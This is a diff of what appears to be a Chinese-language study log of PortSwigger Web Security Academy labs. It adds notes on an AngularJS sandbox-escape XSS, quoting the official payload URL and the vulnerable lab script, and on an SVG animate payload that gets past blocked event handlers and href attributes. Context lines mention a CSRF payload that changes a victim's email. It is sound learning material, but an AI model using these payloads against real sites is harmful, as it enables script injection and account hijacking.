@@ -459,3 +459,34 @@ function handleResponse() {
 就是新建一个请求，然后访问`/my-account`，然后记录CSRF Token，最后请求修改email即可。
 
 但好像自己访问并不会修改email，同时我第二次用这个payload并没有成功solve这个lab，同样的，email也没有修改（第一次是solve了但是email没有修改）。这里应该有一些东西没有彻底搞明白。
+
+## 25. Reflected XSS with AngularJS sandbox escape without strings
+
+> 未解决
+
+**参考资料**
+
+https://portswigger.net/web-security/cross-site-scripting/contexts/client-side-template-injection
+
+https://portswigger.net/research/xss-without-html-client-side-template-injection-with-angularjs
+
+因为没有系统学AngularJS和其相关的攻击方法，我直接来分析官方提供的Payload：`https://xxxxxxx.web-security-academy.net/?search=1&toString().constructor.prototype.charAt%3d[].join;[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)=1`
+
+靶场中的JS如下：
+
+```html
+<section class=blog-header>
+  <script>angular.module('labApp', []).controller('vulnCtrl',function($scope, $parse) {
+      $scope.query = {};
+      var key = 'search';
+      $scope.query[key] = 'Your input';
+      $scope.value = $parse(key)($scope.query);
+    });</script>
+  <h1 ng-controller=vulnCtrl>0 search results for {{value}}</h1>
+  <hr>
+</section>
+```
+
+## 27. Reflected XSS with event handlers and href attributes blocked
+
+测试了发现a标签不会被过滤，但是我用Intruder跑了XSS Cheat Sheet里的所有event，都不合法。无奈之下，只好看了payload：`<svg><a><animate attributeName=href values=javascript:alert(1) /><text x=20 y=20>Click me</text></a>`，这个还是看懂了，只能说，太巧妙了。学到了。
